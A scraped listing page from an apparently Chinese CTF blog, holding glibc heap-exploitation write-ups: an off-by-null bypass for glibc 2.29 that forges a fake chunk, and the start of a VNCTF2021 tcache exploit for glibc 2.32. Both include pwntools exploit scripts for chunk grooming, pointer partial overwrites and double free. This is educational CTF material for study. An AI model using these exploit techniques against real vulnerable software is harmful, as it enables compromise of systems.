<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>-<span class="number">0x8</span>-<span class="number">0xf0</span>,<span class="string">&#x27;padd&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x410</span>) <span class="comment">#1 fd 0x---2b0</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;\x02*0x100&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x03&#x27;</span>*<span class="number">0x410</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x438</span>,<span class="string">&#x27;\x04&#x27;</span>*<span class="number">0x430</span>) <span class="comment">#4 unlink_chunk 0x---c00</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;\x05&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x06&#x27;</span>*<span class="number">0x420</span>) <span class="comment">#6 bk 0x---150</span></span><br><span class="line">add(<span class="number">0x208</span>,<span class="string">&#x27;\x07&#x27;</span>*<span class="number">0x200</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#left fd bk in 0x---c00</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#merge and carve to get 0x---c20 and change size which in 0x---c00 </span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">&#x27;\x08&#x27;</span>*<span class="number">0x418</span> + p64(<span class="number">0xb91</span>)) <span class="comment">#8 set size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#reply</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x09&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 9 0x---c20</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x10&#x27;</span>*<span class="number">0x420</span>) <span class="comment"># 10 bk 0x---150</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 11 fd 0x---2b0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#repair fd</span></span><br><span class="line">free(<span class="number">11</span>) <span class="comment">#0x---2b0</span></span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#0x---c20</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">&#x27;PIG007nb&#x27;</span>) <span class="comment"># 12 0x---2b0 to overflow \x00 in fd</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;\x13&#x27;</span>*<span class="number">0x410</span>) <span class="comment"># 13 0x---c20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#repair bk</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0x9F8</span>,<span class="string">&#x27;\x14&#x27;</span>*<span class="number">0x9f0</span>) <span class="comment"># let 0x---150 0x---c20 into largebin</span></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># 15 0x---150 to overflow \x00 in fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger off-by-null</span></span><br><span class="line"><span class="comment">#add(0x418,&#x27;\x16&#x27;*0x410) # 16 c20</span></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x77&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0xb90</span>))</span><br><span class="line">free(<span class="number">14</span>)</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/2.29%E4%B8%8B%E7%9A%84off-by-null/">2.29下的off-by-null</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>△相比2.29之前的版本中，在向上合并时加了一项检查：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</span><br></pre></td></tr></table></div></figure>

<p>就是检查上一个chunk的size是否等于当前chunk的pre_size。之前的off-by-null肯定是不等于的啊，所以这里就一定会出错。那么2.29的绕过方法就是通过smallbin和largebin来伪造一个chunk，满足：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">①fake_chunk-&gt;fd-&gt;bk == fake_chunk_addr</span><br><span class="line">②fake_chunk-&gt;bk-&gt;fd == fake_chunk_addr</span><br><span class="line">③fake_chunk-&gt;size = trigger_chunk-&gt;pre_size</span><br></pre></td></tr></table></div></figure>

<p>其中③用来过新增加的检查：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</span><br></pre></td></tr></table></div></figure>

<p>①和②用来过unlink中的检查：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</span><br><span class="line">    malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);</span><br></pre></td></tr></table></div></figure>

<p>这样就能够成功off-by-null了，图示如下(用了<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2" >t1an5g的博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>的图片，侵删)：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191444152.png" alt="img"></p>
<p>1.下面简单说下流程：</p>
<p>(1)进行一定的堆布局，使得起作用的chunk的堆地址为0xx…x0010，同时也方便计算偏移，从而进行低位字节覆盖。</p>
<p>(2)通过largebin的fd_nextsize指针和bk_nextsize指针，加上字节覆盖使得fake_chunk的fd指针指向指定FD(即下面的chunk18)，fake_chunk的bk指针指向指定BK(即下面的chunk17)。</p>
<p>(3)通过fastbin和smallbin的连用，加上字节覆盖使得FD(chunk18)的bk指针指向fake_chunk。</p>
<p>(4)通过fastbin加上字节覆盖使得BK(chunk17)的fd指针指向fake_chunk。</p>
<p>(5)进行完以上操作就得到类似上图的堆布局，之后就可以绕过检查，触发off-by-null。</p>
<p>2.详细介绍一下具体实现方法：</p>
<p>(1)先申请17个chunk,chunk0-chunk16，其中chunk0-chunk7用来进行堆布局，使得后面的chunk15的地址为0xx..x0010，即使得申请的堆地址的第二个字节为”\x00”，以便之后覆盖的时候不用进行一字节爆破，从而进行对抗off-by-null的0字节溢出。当然，如果条件限制的话， 其实是可以不用chunk0-chunk7的布局，用一字节爆破来解决问题。chunk8-chunk14大小为0x28，用来填充0x30大小的tcache。chunk15即关键部分，chunk16防止合并。</p>
<p>(2)释放chunk15，size应该大于tcache的最大size，这里的chunk15最好设置大一点，大佬的博客设置了0xb20大小。然后chunk15就会进入unsortedbin中，由于unsortedbin中只有一个chunk15，所以chunk15的指针会有以下效果：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">chunk15-&gt;fd == main_arena+88(unsortebin_addr)</span><br><span class="line">chunk15-&gt;bk == main_arena+88</span><br></pre></td></tr></table></div></figure>

<p>(3)申请一个0x28大小的chunk17，同时由于此时bin中没有chunk，只有Unsortedbin才有chunk15，所以会将chunk15先放入largebin中，之后再从chunk15中切割，返回chunk17，所以此时chunk15在largebin中，又只有它一个chunk，由于放入largebin的赋值语句，所以在切割之前会变成：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">chunk15-&gt;fd == largebin_addr</span><br><span class="line">chunk15-&gt;bk == largebin_addr</span><br><span class="line">chunk15-&gt;fd_nextsize == chunk15_addr</span><br><span class="line">chunk15-&gt;bk_nextsize == chunk15_addr</span><br></pre></td></tr></table></div></figure>

<p>切割之后，chunk17获得了chunk15残留下来的fd，bk，fd_nextsize，bk_nextsize。因为chunk17是用来构造fake_chunk的，所以大小需要至少有0x20。那么此时的chunk17中内容就会如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">chunk17-&gt;fd == largebin_addr</span><br><span class="line">chunk17-&gt;bk == largebin_addr</span><br><span class="line">chunk17-&gt;fd_nextsize == chunk17_addr</span><br><span class="line">chunk17-&gt;bk_nextsize == chunk17_addr</span><br></pre></td></tr></table></div></figure>

<p>然后构造在chunk17里制作fake_chunk，满足：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fake_chunk-&gt;size == trigger_chunk-&gt;pre_size</span><br><span class="line">fake_chunk-&gt;fd == chunk18_addr</span><br><span class="line">fake_chunk-&gt;bk == chunk17_addr</span><br></pre></td></tr></table></div></figure>

<p>这里需要进行赋值：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">chunk17-&gt;fd = trigger_chunk-&gt;pre_size</span><br><span class="line">chunk17-&gt;fd_nextsize = &quot;\x40&quot;</span><br></pre></td></tr></table></div></figure>

<p>(后面会讲到为什么会这么赋值)之后的fake_chunk的bk自动继承了之前残留下来的指针。</p>
<p>(4)申请chunk18-chunk21，大小为0x28。使得chunk18-chunk21都是从chunk15中切割出来的，之后用chunk8-chunk14填满0x30的tcache，然后再顺序释放chunk20和chunk18，使得chunk18,chunk20进入fastbin(0x30)中，顺序为chunk18-&gt;chunk20。</p>
<p>(5)将chunk8-chunk14申请出来，清空tcache(0x30)，然后再申请一个0x400大小的chunk(超过smallbin大小即可)，这样就会将fastbin中的chunk，也就是chunk18和chunk20放入到smallbin中。由于smallbin和fastbin刚好相反，一个是FIFO一个是FILO，所以顺序会反过来，变成：chunk20-&gt;chunk18，但同时由于是bk寻址，所以再申请chunk会先把chunk18取出来，同时在smallbin中，那么就会满足chunk18-&gt;bk == chunk20_addr</p>
<p>(6)此时赋值chunk18-&gt;bk = fake_chunk_addr，这里不用知道堆地址，因为我们知道chunk20_addr - fake_chunk_addr == 0x80(sizeof(fake_chunk)+sizeof(chunk18)+sizeof(chunk19))。所以之前chunk0-chunk7就可以进行一些大小布局，使得chunk15_addr == 0xx…x0010，那么fake_chunk_addr == 0xx…x0020，chunk20_addr == 0xx…x00a0，这样我们就只需要把0xa0覆盖成0x20，也就是修改chunk18-&gt;bk的第一个字节为0x20即可。但同时由于off by null的关系，修改chunk18-&gt;bk的第一个字节势必会导致第二个字节为”\x00”，所以我们之前的堆布局也要使得chunk15_addr的第二个字节为”\x00”才可以。</p>
<p>那么现在也可以理解之前的一个赋值语句：chunk17-&gt;fd_nextsize = “\x40”，这里就是为了将”\x10”覆盖为”\x40”使其指向chunk18，同时使得第二个字节也为”\x00”。</p>
<p>这样就满足了：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fake_chunk-&gt;size == trigger_chunk-&gt;pre_size</span><br><span class="line">fake_chunk-&gt;fd == chunk18_addr</span><br><span class="line">fake_chunk-&gt;bk == chunk17_addr</span><br><span class="line">chun18-&gt;bk == fake_chunk_addr</span><br><span class="line">chunk17-&gt;fd == chunk18_addr</span><br></pre></td></tr></table></div></figure>

<p>但是chunk17-&gt;fd不等于fake_chunk_addr。那么同样的操作再来一次，利用chunk17和chunk19，使其进入fastbin，将chunk17的fd指向chunk19，然后再申请回来，覆盖chunk17的fd指针，0x70覆盖为0x20即可。(由于2.29下的tcache会有key字段，使得chunk17的bk指针被修改，相当于修改fake_chunk的size位，这不是我们想看到的，所以还是用fastbin比较好)流程如下：</p>
<p>①将chunk20从tcache中申请出来，防止之后不好操作，然后再将chunk8-chunk14放入tcache中，使得之后的chunk进入fastbin。</p>
<p>②顺序释放chunk19，chunk17，使其进入fastbin中，使得chunk17-&gt;fd == chunk19_addr，就是0xx…x70。</p>
<p>③然后将chunk8-chunk14申请回来，再将chunk17申请回来，覆盖chunk17的fd的第一个字节为0x20，那么就可以满足总的条件：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fake_chunk-&gt;size == trigger_chunk-&gt;pre_size</span><br><span class="line">fake_chunk-&gt;fd == chunk18_addr</span><br><span class="line">fake_chunk-&gt;bk == chunk17_addr</span><br><span class="line">chunk18-&gt;bk == fake_chunk_addr</span><br><span class="line">chunk17-&gt;fd == fake_chunk_addr</span><br></pre></td></tr></table></div></figure>

<p>(7)最后将chunk19申请回来，再从chunk15剩下的部分申请chunk22用来溢出。再申请chunk23将chunk15遗留的部分都申请回来，溢出之后释放掉，即可触发off by null，向上合并最初的chunk15-0x10大小的chunk，使得fake_chunk，chunk18,chunk19,chunk20,chunk21,chunk22,chunk23都被置入unsortedbin中。利用chunk8-chunk14对抗tcache，就可以随便玩了。(注意这里不需要像之前版本的off by null一样，还需要释放掉chunk0来绕过unlink检查，之前是因为不检查size位，所以直接释放掉即可。这里的fake_chunk已经替代了chunk0的作用，能够绕过Unlink的检查和size位的检查)</p>
<p>3.最后模拟一下代码，同样参考了大佬<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2" >t1an5g的博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>：</p>
<p>(1)前期准备加堆布局:</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 0-6</span></span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">&quot;padding&quot;</span>)</span><br><span class="line">add(<span class="number">0x1000</span>-<span class="number">0x410</span>, <span class="string">&quot;padding&quot;</span>) <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&#x27;tcache&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#crux chunk15</span></span><br><span class="line">add(<span class="number">0xb20</span>, <span class="string">&quot;largebin&quot;</span>) <span class="comment"># 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#prevent merge</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&quot;padding&quot;</span>) <span class="comment"># 16</span></span><br></pre></td></tr></table></div></figure>

<p>(2)制作fake_chunk，利用largebin踩下fd_nextsize和bk_nextsize:</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#chunk15 to largebin</span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#make fake_chunk in chunk17</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x521</span>) + p8(<span class="number">0x40</span>))</span><br></pre></td></tr></table></div></figure>

<p>(3)联动fastbin和smallbin：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment"># 19</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;c&#x27;</span>) <span class="comment"># 20</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;d&#x27;</span>) <span class="comment"># 21</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fill in tcache(0x30)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">    delete(<span class="number">8</span> + i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line">delete(<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear tcache(0x30)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&#x27;padding&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin to smallbin</span></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">&#x27;padding&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get chunk18 from smallbin ,chunk20 to tcache</span></span><br><span class="line"><span class="comment"># change chunk18-&gt;bk to point to fake_chunk</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0</span>) + p8(<span class="number">0x20</span>))</span><br></pre></td></tr></table></div></figure>

<p>(4)利用fastbin修改chunk17-&gt;fd：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clear chunk from tcache</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&#x27;clear&#x27;</span>) <span class="comment"># 20 from tcache</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">    delete(<span class="number">8</span> + i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free to fastbin</span></span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>): <span class="comment"># 8-14</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change chunk17-&gt;fd to point to fake_chunk</span></span><br><span class="line">add(<span class="number">0x28</span>, p8(<span class="number">0x20</span>))</span><br></pre></td></tr></table></div></figure>

<p>(5)触发off-by-null:</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;clear&quot;</span>)<span class="comment">#19 from fastbin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;a&quot;</span>) <span class="comment"># 22 cutting from chunk15 in unsortebin,for overwrite</span></span><br><span class="line">add(<span class="number">0x5f8</span>, <span class="string">&quot;a&quot;</span>) <span class="comment"># 23 legacy from chunk15 in unsortebin,for trigger off-by-null</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&quot;padding&quot;</span>) <span class="comment"># 24</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># off-by-null </span></span><br><span class="line">edit(<span class="number">22</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x20</span> + p64(<span class="number">0x520</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">delete(<span class="number">23</span>)</span><br></pre></td></tr></table></div></figure>

<p>△以上的chunk索引对于题目具体分析，不同题目对索引的处理肯定不一样。</p>
<p>其实还有其他只利用unsortedbin和largebin的绕过，贴一下地址：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236078#h3-14" >https://www.anquanke.com/post/id/236078#h3-14</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>后面再来啃吧。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/2.32%E4%B8%8B%E7%9A%84tcache%E5%88%A9%E7%94%A8-VNCTF2021%20ff/">2.32下的tcache利用-VNCTF2021 ff</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>通过这题学习下2.32下的tcache，同时还学到好多东西。</p>
<p>1.先解析下题目，大概是提供了分配、释放、编辑、打印堆块的功能，不过限制了只能打印一次、编辑两次，同时还限制了不能分配0x90及以上的堆块。然后释放功能指针没清空，有UAF，保护全开。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsJXQhGvoTieV14xa.png" alt="img"></p>
<p>2.首先泄露地址：因为2.32要利用doble-free必须泄露堆地址，所以show()功能肯定先被用掉，直接从free的chunk的fd指针泄露出heap_base，因为2.32的safe-linking异或机制就是下一个chunk和heap_base异或放入fd。</p>
<p>那么就思考之后怎么泄露Libc地址，可以通过劫持IO来泄露，但是劫持IO也需要libc地址才行啊，这里就用到爆破，利用unsortebin来留下地址在tcache结构体上，然后部分写2个字节来爆破半个字节。因为IO和main_arena其实相距不是太远，调试就可以知道。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-01-47.png" alt="img"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_base</span></span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">heap_leak = u64(rc(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_leak*<span class="number">0x1000</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:0x%x&quot;</span>%heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#change key to make double free</span></span><br><span class="line">edit(<span class="string">&#x27;PIG007NBPIG007NB&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"><span class="comment">#change 0x290(7) to free tcache(0x290) into unsortedbin</span></span><br><span class="line">edit(p64((heap_leak) ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">&#x27;PIG007NB&#x27;</span>)</span><br><span class="line">new(<span class="number">0x80</span>, <span class="string">&#x27;\x00\x00&#x27;</span> *((<span class="number">0x290</span>-<span class="number">0x20</span>)/<span class="number">0x10</span>) + <span class="string">&#x27;\x07\x00&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment">#--------------------------------------------</span></span><br><span class="line">new(<span class="number">0x88</span>, (<span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x02\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> + <span class="string">&#x27;\x00\x00&#x27;</span> * <span class="number">2</span> + <span class="string">&#x27;\x01\x00&#x27;</span>).ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#--------------------------------------------</span></span><br></pre></td></tr></table></div></figure>

